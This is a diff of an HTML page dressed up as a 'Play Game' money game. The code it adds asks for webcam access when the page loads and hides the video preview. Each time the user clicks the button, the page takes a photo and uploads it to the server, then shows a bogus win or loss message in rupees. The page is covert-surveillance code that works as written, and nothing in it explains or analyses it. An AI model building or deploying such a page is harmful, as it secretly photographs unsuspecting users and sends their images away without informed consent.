@@ -3,60 +3,108 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Play Game</title>
+  <title>Quiz Camera AI</title>
   <style>
     body {
       font-family: 'Poppins', sans-serif;
-      text-align: center;
-      background: linear-gradient(135deg, #1a1a1a, #222);
+      background: linear-gradient(135deg, #222, #555);
       color: white;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      overflow: hidden;
+      text-align: center;
+      margin: 0;
+      padding: 40px;
+    }
+
+    h1 {
+      font-size: 28px;
+      margin-bottom: 20px;
     }
 
     button {
-      background-color: #ff0055;
-      color: white;
+      background-color: #4CAF50;
       border: none;
-      padding: 15px 35px;
-      font-size: 20px;
+      color: white;
+      padding: 14px 28px;
+      font-size: 18px;
       border-radius: 10px;
       cursor: pointer;
       transition: all 0.3s ease;
     }
 
     button:hover {
-      background-color: #ff3377;
-      transform: scale(1.1);
+      background-color: #45a049;
+      transform: scale(1.05);
+    }
+
+    video {
+      display: none; /* 👁 Hidden camera preview */
     }
 
     #status {
-      margin-top: 20px;
       font-size: 22px;
-      color: #00ff88;
+      margin-top: 25px;
+      font-weight: bold;
     }
 
-    #camera {
-      display: none;
-    }
-
-    canvas {
-      display: none;
+    .active {
+      color: #00ff99;
     }
   </style>
 </head>
 <body>
-  <h1>🎮 Welcome to the Game 🎮</h1>
-  <button id="startBtn">Play Game</button>
-  <p id="status"></p>
+  <h1>🎮 Game is Active</h1>
+  <p>Click <b>Play Game</b> to try your luck!</p>
+  <button id="playGame">Play Game</button>
+  <video id="video" autoplay playsinline></video>
+  <div id="status"></div>
 
-  <video id="camera" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
+  <script>
+    const video = document.getElementById("video");
+    const playGame = document.getElementById("playGame");
+    const statusDiv = document.getElementById("status");
 
-  <script src="script.js"></script>
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+      } catch (err) {
+        alert("Camera access denied!");
+      }
+    }
+
+    async function captureAndUpload() {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append("photo", blob, "photo.png");
+
+        try {
+          const res = await fetch("/upload", {
+            method: "POST",
+            body: formData,
+          });
+          const data = await res.json();
+
+          if (data.fileUrl) {
+            statusDiv.textContent = "🎉 You got 100 Rs successfully!";
+            statusDiv.style.color = "#00ff99";
+          } else {
+            statusDiv.textContent = "❌ You lost 100 Rs!";
+            statusDiv.style.color = "red";
+          }
+        } catch (e) {
+          statusDiv.textContent = "❌ You lost 100 Rs!";
+          statusDiv.style.color = "red";
+        }
+      }, "image/png");
+    }
+
+    playGame.onclick = () => captureAndUpload();
+
+    startCamera();
+  </script>
 </body>
 </html>
